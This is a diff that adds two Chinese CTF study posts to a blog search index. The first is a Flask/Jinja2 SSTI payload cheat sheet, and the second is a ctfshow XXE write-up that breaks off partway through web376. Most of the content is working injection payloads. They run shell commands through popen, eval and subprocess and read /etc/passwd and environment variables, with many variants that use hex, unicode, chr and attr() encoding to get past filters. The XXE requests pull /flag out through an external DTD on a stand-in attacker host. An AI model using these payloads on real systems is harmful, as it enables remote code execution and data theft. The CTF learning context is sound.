@@ -1,6 +1,298 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Flask Jinja2 SSTI学习记录</title>
+    <url>/2024/03/09/Jinja2%20SSTI/</url>
+    <content><![CDATA[<h1 id="Flask-Jinja2"><a href="#Flask-Jinja2" class="headerlink" title="Flask Jinja2"></a>Flask Jinja2</h1><p>flask是使用Jinja2来作为渲染引擎的，模板文件并不是单纯的html代码，而是夹杂着模板的语法，因</p>
+<p>为页面不可能都是一个样子的，有一些地方是会变化的。比如说显示用户名的地方，这个时候就需要使用模板支持的语法，来传参。</p>
+<p>flask的渲染方法有render_template和render_template_string两种。</p>
+<p>感觉…没什么好多说的，就是记模板</p>
+<span id="more"></span>
+
+<h2 id="模板和过滤（前提：以GET给name传参）"><a href="#模板和过滤（前提：以GET给name传参）" class="headerlink" title="模板和过滤（前提：以GET给name传参）"></a>模板和过滤（前提：以GET给name传参）</h2><h3 id="通用（并不是每一个题目都有以下几类）"><a href="#通用（并不是每一个题目都有以下几类）" class="headerlink" title="通用（并不是每一个题目都有以下几类）"></a>通用（并不是每一个题目都有以下几类）</h3><h4 id=""><a href="#" class="headerlink" title="&lt;class os.wrap_close&gt;"></a><code>&lt;class os.wrap_close&gt;</code></h4><h5 id="popen"><a href="#popen" class="headerlink" title="popen"></a><code>popen</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[138].__init__.__globals__[&quot;popen&quot;](&quot;ls /&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>讲述一些小细节：</p>
+<ul>
+<li><p><code>__bases__</code>后面的数字是根据实际情况，以<strong>object</strong>类出现的位数而定的（一般是<code>__bases__</code>为0，<code>__mro__</code>为1）</p>
+</li>
+<li><p><code>__subclasses__</code>后面的数字是根据实际情况，以<strong>os.wrap_close</strong>出现的位数而定的</p>
+</li>
+</ul>
+<p>直接读文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[138].__init__.__globals__.get(&#x27;popen&#x27;)(&#x27;dir&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="builtins"><a href="#builtins" class="headerlink" title="__builtins__"></a><code>__builtins__</code></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__bases__.__subclasses__()[138].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个类有个<strong>eval</strong>内置方法就可以执行命令</p>
+<p>这里有个坑，就是在执行命令的时候不能用<strong>system</strong>函数</p>
+<p>因为在flask里面执行system的时候返回的是状态码，也就是看不到回显，只会回显一些数字，所以要用popen，而且最好16进制编码一下，不然容易触发黑名单，还能避免很多大大小小的错误</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(138).__init__.__globals__.get(&#x27;__builtins__&#x27;).get(&#x27;open&#x27;)(&#x27;dir&#x27;).read()&#125;&#125;</span><br><span class="line">//get()方式绕过</span><br></pre></td></tr></table></figure>
+
+<h5 id="sys"><a href="#sys" class="headerlink" title="sys"></a><code>sys</code></h5><p>听说有用，目前还没见到</p>
+<h4 id="-1"><a href="#-1" class="headerlink" title="&lt;type &#39;file&#39;&gt; "></a><code>&lt;type &#39;file&#39;&gt; </code></h4><p>读取文件类，&lt;type ‘file’&gt; file位置一般为40，直接调用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[40](&#x27;fl4g&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="-2"><a href="#-2" class="headerlink" title="&lt;class &#39;site._Printer&#39;&gt;"></a><code>&lt;class &#39;site._Printer&#39;&gt;</code></h4><p>调用<code>os</code>的<code>popen</code>执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;ls /&#x27;).read()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;ls /flasklight&#x27;).read()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[71].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;os&#x27;].popen(&#x27;cat coomme_geeeett_youur_flek&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果system被过滤，用os的listdir读取目录+file模块读取文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="-3"><a href="#-3" class="headerlink" title="&lt;class &#39;subprocess.Popen&#39;&gt;"></a><code>&lt;class &#39;subprocess.Popen&#39;&gt;</code></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[258](&#x27;ls&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[258](&#x27;ls /flasklight&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[258](&#x27;cat /flasklight/coomme_geeeett_youur_flek&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br><span class="line">//读环境变量</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[245](&#x27;env&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="-4"><a href="#-4" class="headerlink" title="&lt;class &#39;warnings.catch_warnings&#39;&gt;"></a><code>&lt;class &#39;warnings.catch_warnings&#39;&gt;</code></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#调用file</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;file&#x27;](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br><span class="line">#把 read() 改为 write() 就是写文件</span><br><span class="line">#调用eval</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[59].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line">#调用system方法</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__.values()[12].__dict__.values()[144](&#x27;whoami&#x27;)&#125;&#125;</span><br><span class="line">#调用commands进行命令执行</span><br><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__bases__.__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;commands&#x27;).getstatusoutput(&#x27;ls /&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤_"></a>过滤<code>_</code></h4><h5 id="引号内十六进制绕过"><a href="#引号内十六进制绕过" class="headerlink" title="引号内十六进制绕过"></a>引号内十六进制绕过</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__ &#125;&#125;</span><br><span class="line">&#123;&#123;&quot;&quot;.&quot;\x5f\x5fclass\x5f\x5f&quot; &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>_</code>是<code>\x5f</code>，<code>.</code>是<code>\x2E</code></p>
+<h4 id="过滤-1"><a href="#过滤-1" class="headerlink" title="过滤[]"></a>过滤<code>[]</code></h4><h5 id="getitem"><a href="#getitem" class="headerlink" title="__getitem__()"></a><code>__getitem__()</code></h5><p><code>d[&#39;a&#39;]</code> 等价于<code>d.__getitem__(&#39;a&#39;)</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;.__class__.__bases__.__getitem__(&#x27;0&#x27;).__subclasses__().__getitem__(&#x27;138&#x27;).__init__.__globals__[&quot;popen&quot;](&quot;ls /&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="pop"><a href="#pop" class="headerlink" title="pop()"></a><code>pop()</code></h5><p><code>d[&#39;a&#39;]</code> 等价于<code>d.pop(&#39;a&#39;)</code></p>
+<h4 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h4><h5 id="单双引号互换"><a href="#单双引号互换" class="headerlink" title="单双引号互换"></a>单双引号互换</h5><h5 id="http-get（用GET方式传入）"><a href="#http-get（用GET方式传入）" class="headerlink" title="http_get（用GET方式传入）"></a>http_get（用GET方式传入）</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.mro__.__getitem__(1).__subclasses__().__getitem__(138).__init__.__globals__.get(&#x27;popen&#x27;)(&#x27;dir&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>等价于</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;().__class__.mro__.__getitem__(1).__subclasses__().__getitem__(138).__init__.__globals__.get(request.args.func)(request.args.cmd).read()&#125;&#125;&amp;func=popen&amp;cmd=dir</span><br></pre></td></tr></table></figure>
+
+<h4 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h4><h5 id="拼接关键字绕过"><a href="#拼接关键字绕过" class="headerlink" title="拼接关键字绕过"></a>拼接关键字绕过</h5><h6 id="引号内拼接"><a href="#引号内拼接" class="headerlink" title="引号内拼接"></a>引号内拼接</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1]&#125;&#125;</span><br><span class="line">等价于</span><br><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__c&#x27;&#x27;lass__&#x27;][&#x27;__m&#x27;&#x27;ro__&#x27;][1]&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__c&#x27;+&#x27;lass__&#x27;][&#x27;__m&#x27;+&#x27;ro__&#x27;][1]&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;[&#x27;__c&#x27;~&#x27;lass__&#x27;][&#x27;__m&#x27;~&#x27;ro__&#x27;][1]&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>参考payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;[&#x27;__cla&#x27;&#x27;ss__&#x27;][&#x27;__bas&#x27;&#x27;es__&#x27;][0][&#x27;__subcl&#x27;&#x27;asses__&#x27;]()[117][&#x27;__in&#x27;&#x27;it__&#x27;].__globals__[&#x27;po&#x27;&#x27;pen&#x27;](&#x27;ls /&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h6 id="attr"><a href="#attr" class="headerlink" title="attr()"></a><code>attr()</code></h6><p>这个比较特殊</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__base__&#125;&#125;</span><br><span class="line">等价于</span><br><span class="line">&#123;&#123;&#x27;&#x27;|attr(&#x27;__cl&#x27;&#x27;ass__&#x27;)|attr(&#x27;__ba&#x27;&#x27;se__&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;&quot;&quot;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;)|attr(&quot;__ba&quot;&quot;se__&quot;)&#125;&#125; //unicode绕过</span><br></pre></td></tr></table></figure>
+
+<p>参考payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;%print&quot;&quot;|attr(&quot;__cla&quot;&quot;ss__&quot;)|attr(&quot;__ba&quot;&quot;se__&quot;)|attr(&quot;__subc&quot;&quot;lasses__&quot;)()|attr(138)|attr(&quot;__in&quot;&quot;it__&quot;)|attr(&quot;__glo&quot;&quot;bals__&quot;)|attr(&quot;get&quot;)(&quot;__builtins__&quot;)|attr(&quot;get&quot;)(&quot;eval&quot;)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里注意一下，其中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[&#x27;__builtins__&#x27;]</span><br><span class="line">应当是</span><br><span class="line">|attr(&quot;get&quot;)(&quot;__builtins__&quot;)</span><br><span class="line">而不仅仅是|attr(&quot;__builtins__&quot;)</span><br><span class="line">[&quot;eval&quot;]同理</span><br></pre></td></tr></table></figure>
+
+<p>unicode绕过参考payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;)()|attr(138)|attr(&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;)|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;)|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&quot;)|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u0065\u0076\u0061\u006c&quot;)(&quot;\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0027\u006f\u0073\u0027\u0029\u002e\u0070\u006f\u0070\u0065\u006e\u0028\u0027\u006c\u0073\u0020\u002f\u0027\u0029\u002e\u0072\u0065\u0061\u0064\u0028\u0029&quot;)&#125;&#125;</span><br><span class="line">//这里是ls /</span><br></pre></td></tr></table></figure>
+
+<p>当然，<code>attr()</code>用<code>[]</code>代替也可以，但是完全替代就出不来了…</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;%print(((((((((&quot;&quot;|attr(&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;))()|attr(140))|attr(&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;))|attr(&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;)))|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&quot;))|attr(&quot;\u0067\u0065\u0074&quot;)(&quot;\u0065\u0076\u0061\u006c&quot;)(&quot;\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0027\u006f\u0073\u0027\u0029\u002e\u0070\u006f\u0070\u0065\u006e\u0028\u0027\u006c\u0073\u0020\u002f\u0027\u0029\u002e\u0072\u0065\u0061\u0064\u0028\u0029&quot;))%&#125;</span><br></pre></td></tr></table></figure>
+
+<p>以上是盲注的写法</p>
+<h5 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h5><p><strong>base64</strong></p>
+<p>成功率有点低就是了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__class__</span><br><span class="line">等价于</span><br><span class="line">__getattribute__(&#x27;X19jbGFzc19f&#x27;.decode(&#x27;base64&#x27;))</span><br></pre></td></tr></table></figure>
+
+<p><strong>chr</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;|attr(&quot;__cla&quot;&quot;ss__&quot;)|attr(&quot;__ba&quot;&quot;se__&quot;)|attr(&quot;__subc&quot;&quot;lasses__&quot;)()|attr(10)|attr(&quot;__in&quot;&quot;it__&quot;)|attr(&quot;__glo&quot;&quot;bals__&quot;)|attr(&quot;get&quot;)(&quot;__builtins__&quot;)|attr(&quot;get&quot;)(&quot;eval&quot;)(&quot;eval(chr(95)%2bchr(95)%2bchr(105)%2bchr(109)%2bchr(112)%2bchr(111)%2bchr(114)%2bchr(116)%2bchr(95)%2bchr(95)%2bchr(40)%2bchr(39)%2bchr(111)%2bchr(115)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)%2bchr(40)%2bchr(39)%2bchr(99)%2bchr(97)%2bchr(116)%2bchr(32)%2bchr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%2bchr(39)%2bchr(41)%2bchr(46)%2bchr(114)%2bchr(101)%2bchr(97)%2bchr(100)%2bchr(40)%2bchr(41))&quot;)&#125;&#125;</span><br><span class="line">//这里不是ls /！！</span><br></pre></td></tr></table></figure>
+
+<h5 id="http-get"><a href="#http-get" class="headerlink" title="http_get"></a>http_get</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;|attr(request.args.cla)|attr(request.args.bas)|attr(request.args.sub)().pop(138)|attr(request.args.ini)|attr(request.args.glo)|attr(request.args.geti)(request.args.bui)|attr(request.args.geti)(request.args.ii)(request.args.hh)&#125;&#125;&amp;cla=__class__&amp;bas=__bases__&amp;sub=__subclasses__&amp;ini=__init__&amp;glo=__globals__&amp;bui=__builtins__&amp;hh=__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&amp;ii=eval&amp;geti=__getitem__</span><br></pre></td></tr></table></figure>
+
+<p>写一个16进制编码的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?name=&#123;&#123;&quot;&quot;[&quot;\x5F\x5Fc&quot;~&quot;lass&quot;~&quot;\x5F\x5F&quot;][&quot;\x5F\x5Fb&quot;~&quot;ases&quot;~&quot;\x5F\x5F&quot;][0][&quot;\x5F\x5Fsubc&quot;~&quot;lasses&quot;~&quot;\x5F\x5F&quot;]()[166][&quot;\x5F\x5Fi&quot;~&quot;nit&quot;~&quot;\x5F\x5F&quot;][&quot;\x5F\x5Fg&quot;~&quot;lobals&quot;~&quot;\x5F\x5F&quot;][&quot;\x5F\x5Fbuiltins\x5F\x5F&quot;][&quot;eval&quot;](&quot;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x70\x6f\x70\x65\x6e\x28\x27\x6c\x73\x27\x29\x2e\x72\x65\x61\x64\x28\x29&quot;)&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>SSTI</category>
+      </categories>
+      <tags>
+        <tag>SSTI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctfshow XXE 刷题记录</title>
+    <url>/2024/04/02/ctfshow%20XEE%20%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<h1 id="web373-web374"><a href="#web373-web374" class="headerlink" title="web373-web374"></a>web373-web374</h1><p>传送门：</p>
+<p><a href="https://ed3n.top/2024/03/11/XXE%E6%BC%8F%E6%B4%9E/">XXE学习记录 | Ed3n’s Blog</a></p>
+<h1 id="web375"><a href="#web375" class="headerlink" title="web375"></a>web375</h1><p>先看源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 15:22:05</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure>
+
+<p>与上题的区别是多了如下代码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>相当于是不能出现 <code>&lt;?xml version=&quot;1.0&quot;</code> </p>
+<h2 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h2><p>不要不就好了？web374 的做法也没有加 <code>&lt;?xml  version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</code>。那就和 web374 做法一致就行</p>
+<h2 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h2><p>在<code>&lt;?xml version=&quot;1.0&quot;</code>中的空格后加个换行符，发包内容为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: b9bd31cd-52ff-4eb0-b2b2-9ae0b6528086.challenge.ctf.show</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 212</span><br><span class="line"></span><br><span class="line">&lt;?xml </span><br><span class="line"> version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:8000/XXE.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>成功接收到 flag</p>
+<p><img src="https://s2.loli.net/2024/03/27/6jUB9ZCleKzR1FH.png" alt="image-20240327172210794"></p>
+<h2 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h2><p>在<code>&lt;?xml version=&quot;1.0&quot;</code>中的空格后再加个空格，发包内容为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: b9bd31cd-52ff-4eb0-b2b2-9ae0b6528086.challenge.ctf.show</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 212</span><br><span class="line"></span><br><span class="line">&lt;?xml  version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://vps-ip:8000/XXE.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>成功接收到 flag</p>
+<p><img src="https://s2.loli.net/2024/03/27/Lb2ykmlj4vscCDg.png" alt="image-20240327173015025"></p>
+<h1 id="web376"><a href="#web376" class="headerlink" title="web376"></a>web376</h1><p>先看源码：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 15:23:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/i&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br></pre></td></tr></table></figure>
+
+<p>与上题的区别是多了如下代码：</p>
